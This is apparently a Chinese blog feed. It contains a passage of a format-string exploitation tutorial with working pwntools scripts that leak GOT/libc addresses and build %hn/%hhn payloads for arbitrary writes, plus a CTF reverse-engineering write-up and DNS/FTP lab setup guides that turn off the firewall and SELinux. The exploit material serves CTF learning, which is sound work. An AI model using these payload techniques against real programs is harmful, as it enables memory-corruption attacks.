title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p><h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p><h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol><li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li><li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p><h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul><li>使用方法类似于%s的任意地址读取，只是换成了%n。</li><li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li></ul><h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p><h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p><h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p><ol><li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p></li><li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></p></li><li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p></li></ol><p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p><ul><li>前面已经输出的字符数小于这次要输出的字符数</li><li>前面已经输出的字符数等于于这次要输出的字符数</li><li>前面已经输出的字符数大于这次要输出的字符数</li></ul><p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p><p>单字节：</p><pre><code class="python"># prev 前面已经输出多少字符# val 要写入的值# idx  偏移def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#搭配：prev = 0 payload = &quot;&quot;# x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样# idx是偏移，key是要写入的目标值for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>双字节：</p><pre><code class="python">#跟上个基本一样，只是改了部分地方def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p><h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):你控制的第一个格式化程序的偏移量</li><li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li><li>numbwritten (int):已经由 printf 函数写入的字节数</li><li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li></ul><p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p><ul><li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li><li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li></ul><p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_高校战疫赛\_RE-天津垓</title>
    <link href="/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <url>/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-高校战疫赛-RE-天津垓"><a href="#XCTF-高校战疫赛-RE-天津垓" class="headerlink" title="XCTF_高校战疫赛_RE_ 天津垓_"></a>XCTF_高校战疫赛_RE_ 天津垓_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。</p><h2 id="初步运行"><a href="#初步运行" class="headerlink" title="初步运行"></a>初步运行</h2><p>发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>看来是需要输入判断。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。</p><pre><code class="python">v39 = &#39;Rising_Hopper!&#39;result = &#39;&#39;key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16]tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21]for i in range(len(key)):    x = 0    flag = 1    while flag:        if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] :            flag = 0            result += chr(x)        else:            x += 1print(result)#result = &#39;Caucasus@s_ability&#39;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*<em>Unk_10040164D *</em> 做了一些处理然后又返回到这堆数据。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。</p><p>然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法<strong>将其改变成伪代码</strong>，这样就好分析多了。</p><h3 id="patch程序"><a href="#patch程序" class="headerlink" title="patch程序"></a>patch程序</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用<strong>010editor</strong>，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>我起初改成这样就不行，位位对齐，改成其他字符串就好了。</p><h3 id="ida动态调试："><a href="#ida动态调试：" class="headerlink" title="ida动态调试："></a>ida动态调试：</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 上面，右键新建一个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>整完的样子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>然后解密这里：</p><pre><code class="python">flag = &#39;&#39;key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375]for i in range(51) :    flag += chr(int(key[i] / 19683))print(flag)</code></pre><p>然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- DNS搭建记录</title>
    <link href="/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>全称： domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="域名服务基础"><a href="#域名服务基础" class="headerlink" title="域名服务基础"></a>域名服务基础</h2><h3 id="DNS作用及类型"><a href="#DNS作用及类型" class="headerlink" title="DNS作用及类型"></a>DNS作用及类型</h3><h4 id="DNS-系统的作用-："><a href="#DNS-系统的作用-：" class="headerlink" title="DNS 系统的作用 ："></a>DNS 系统的作用 ：</h4><ul><li>正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见）</li><li>反向解析：根据 IP 地址查找对应的主机域名（通信行业常用）</li></ul><h4 id="DNS-系统的工作模式："><a href="#DNS-系统的工作模式：" class="headerlink" title="DNS 系统的工作模式："></a>DNS 系统的工作模式：</h4><ul><li>递归查询 ：访问必须有一次一回，会返回成功或者失败。</li><li>迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。<h4 id="域名结构："><a href="#域名结构：" class="headerlink" title="域名结构："></a>域名结构：</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>全世界有13台根域名服务器。<h4 id="BIND软件服务"><a href="#BIND软件服务" class="headerlink" title="BIND软件服务"></a>BIND软件服务</h4></li></ul><pre><code class="html">服务名：named 端口号：53主配置文件：/etc/named.conf保存 DNS 解析记录的数据文件位于：/var/named/</code></pre><h4 id="主配置文件部分参数："><a href="#主配置文件部分参数：" class="headerlink" title="主配置文件部分参数："></a>主配置文件部分参数：</h4><pre><code class="html">listen-on port 53 { 127.0.0.1; }; //要填入自己主机iplisten-on-v6 port 53 { ::1; }; allow-query     { any; };//意思是给任何网段进行解析</code></pre><p>分别是: ipv4监听端口和ip地址，默认只有本地的<br>  ipv6的监听端口和ip地址</p><pre><code class="html">recursion yes;             // 递归还是迭代查询dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre><p>这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。</p><h4 id="区域文件部分参数："><a href="#区域文件部分参数：" class="headerlink" title="区域文件部分参数："></a>区域文件部分参数：</h4><pre><code class="html">    zone &quot;baidu.com&quot; IN {      type master;      file &quot;baidu.localhost&quot;; //本机记录文件名称（可以diy）      allow-update { none; };       };     //正向    zone &quot;131.140.168.192.in-addr.arpa&quot; IN {               type master;               file &quot;baidu.empty&quot;;              allow-update { none; };      };    //反向//对于其中 file 自定义的名字，要与数据配置文件里面名字相同。</code></pre><h2 id="实验搭建过程"><a href="#实验搭建过程" class="headerlink" title="实验搭建过程"></a>实验搭建过程</h2><p>要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1</p><h3 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h3><h4 id="关闭防火墙、SELinux"><a href="#关闭防火墙、SELinux" class="headerlink" title="关闭防火墙、SELinux"></a>关闭防火墙、SELinux</h4><pre><code class="html">vi /etc/selinux/config</code></pre><p>把改成 SELINUX = disabled 然后<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> 关闭防火墙。</p><h4 id="配置主配置文件："><a href="#配置主配置文件：" class="headerlink" title="配置主配置文件："></a>配置主配置文件：</h4><pre><code class="html">vi /etc/named.conf</code></pre><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>注意分号不要忘记，ip填的是本机地址。</p><h4 id="配置区域文件"><a href="#配置区域文件" class="headerlink" title="配置区域文件"></a>配置区域文件</h4><pre><code class="html">vi /etc/named.rfc1912.zones</code></pre><pre><code class="html">zone &quot;chumen77.com&quot; IN {        type master;        file &quot;chumen77.localhost&quot;;        allow-update { none; };};zone &quot;10.16.172.in-addr.arpa&quot; IN {        type master;        file &quot;chumen77.loopback&quot;;        allow-update { none; };};</code></pre><ul><li>其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。</li><li>并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。</li></ul><h4 id="配置正向反向解析数据文件"><a href="#配置正向反向解析数据文件" class="headerlink" title="配置正向反向解析数据文件"></a>配置正向反向解析数据文件</h4><pre><code class="html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre><ul><li>-p 是用来复制文件的权限情况。</li><li>来拷贝一下，方便直接修改。</li></ul><p>正向解析文件 ：</p><pre><code class="html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre><p>反向解析文件：</p><pre><code class="html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre><p>注意每个网址后面要加个点。</p><h4 id="检查和开启"><a href="#检查和开启" class="headerlink" title="检查和开启"></a>检查和开启</h4><p><code>named-checkzone</code> 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。</p><pre><code class="html">systemctl start named</code></pre><p>开启服务，如果出现无法开启，有异常：</p><pre><code class="html">cat /var/log/messages </code></pre><p>用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。</p><h3 id="客户机设置"><a href="#客户机设置" class="headerlink" title="客户机设置"></a>客户机设置</h3><h4 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h4><pre><code class="html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>修改网卡信息 ：</p><pre><code class="html">DNS1=192.168.140.131</code></pre><p>要在最后加上你dns服务器的ip。注意是 <code>DNS1</code>. 设置好后重启网卡。</p><pre><code class="html">service network restart</code></pre><h4 id="测速是否成功"><a href="#测速是否成功" class="headerlink" title="测速是否成功"></a>测速是否成功</h4><p>使用一下 <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>正向反向都成功了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux\_ftp服务搭建踩坑记录</title>
    <link href="/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="linux-ftp服务搭建简单记录"><a href="#linux-ftp服务搭建简单记录" class="headerlink" title="linux_ftp服务搭建简单记录_"></a>linux_ftp服务搭建简单记录_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。</p><h2 id="两种服务模式"><a href="#两种服务模式" class="headerlink" title="两种服务模式"></a>两种服务模式</h2><ul><li>主动模式：FTP服务器主动向客户端发起连接请求。</li><li>被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。<h2 id="vsftpd服务程序"><a href="#vsftpd服务程序" class="headerlink" title="vsftpd服务程序"></a>vsftpd服务程序</h2>ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。<br>vsftpd作为更加安全的文件传输的服务程序，允许用户以<strong>三种认证模式</strong>登录到FTP服务器上。</li><li><strong>匿名开放模式</strong>：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。</li><li><strong>本地用户模式</strong>：是通过<strong>Linux系统本地的账户密码</strong>信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。</li><li><strong>虚拟用户模式</strong>：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="html">yum -y install vsftpd</code></pre></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主配置文件路径 ：</p><pre><code class="html">/etc/vsftpd/vsftpd.conf</code></pre><p>常用的配置参数以及作用如下：</p><pre><code class="html">参数                                作用listen=[YES|NO]              是否以独立运行的方式监听服务listen_address=IP地址        设置要监听的IP地址listen_port=21               设置FTP服务的监听端口download_enable＝[YES|NO]    是否允许下载文件userlist_enable=[YES|NO]     设置用户列表为“允许”还是“禁止”操作userlist_deny=[YES|NO]      设置用户列表为“允许”还是“禁止”操作max_clients=0                最大客户端连接数，0为不限制max_per_ip=0                 同一IP地址的最大连接数，0为不限制anonymous_enable=[YES|NO]    是否允许匿名用户访问anon_upload_enable=[YES|NO]  是否允许匿名用户上传文件anon_umask=022               匿名用户上传文件的umask值anon_root=/var/ftp           匿名用户的FTP根目录anon_mkdir_write_enable=[YES|NO]    是否允许匿名用户创建目录anon_other_write_enable=[YES|NO]    是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限）anon_max_rate=0               匿名用户的最大传输速率（字节/秒），0为不限制local_enable=[YES|NO]         是否允许本地用户登录FTPlocal_umask=022                本地用户上传文件的umask值local_root=/var/ftp            本地用户的FTP根目录chroot_local_user=[YES|NO]    是否将用户权限禁锢在FTP目录，以确保安全local_max_rate=0              本地用户最大传输速率（字节/秒），0为不限制</code></pre><p>在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。</p><h3 id="开启vsftpd服务"><a href="#开启vsftpd服务" class="headerlink" title="开启vsftpd服务"></a>开启vsftpd服务</h3><pre><code class="html">service vsftpd start  systemctl start vsftpd</code></pre><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="0x1-："><a href="#0x1-：" class="headerlink" title="0x1 ："></a>0x1 ：</h3><p>因为是实验机，随便折腾，为了实验的成功，需要<strong>关闭防火墙</strong> 和<strong>SELinux服务</strong>。</p><h4 id="防火墙："><a href="#防火墙：" class="headerlink" title="防火墙："></a>防火墙：</h4><p>CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。<br>firewalld防火墙关闭代码：</p><pre><code class="html">关闭防火墙systemctl stop firewalld.service永久禁止防火墙 systemctl disable firewalld.service检查防火墙状态 systemctl status firewalld.service提示：Active: inactive (dead)就表示关闭了。</code></pre><p>iptables防火墙关闭代码 ：</p><pre><code class="html">查询防火墙状态    :    service  iptables status停止防火墙   :        service   iptables stop启动防火墙   :        service   iptables start重启防火墙   :        service   iptables restart永久关闭防火墙    :     chkconfig   iptables off永久关闭后启用    :   chkconfig   iptables on</code></pre><h4 id="SELinux服务："><a href="#SELinux服务：" class="headerlink" 